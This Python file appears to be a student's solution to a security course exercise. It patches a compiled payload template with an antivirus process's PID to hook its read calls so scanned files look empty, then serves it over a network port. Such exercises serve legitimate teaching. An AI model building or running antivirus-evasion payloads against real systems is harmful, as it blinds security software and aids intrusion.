import addresses
import evasion

# unusual value to overide with run time pid of the antivirus
UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to intercept all calls to read.

        Reminder: We want to intercept all calls to read (for all files)
        and replace them with calls that read a length of 0 bytes (to make
        the files appear empty).

        Notes:
        1. You can assume we already compiled q4.c into q4.template.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q4.template'
        # change to little endian
        pid_in_bytes = addresses.address_to_bytes(pid)
        # do the binary patching of the globals
        with open(PATH_TO_TEMPLATE, "r+b") as read_writer:
            general_payload = read_writer.read()

        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_PID_VALUE_FOR_BIN_PATCH), pid_in_bytes)
        payload = general_payload
        return payload

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
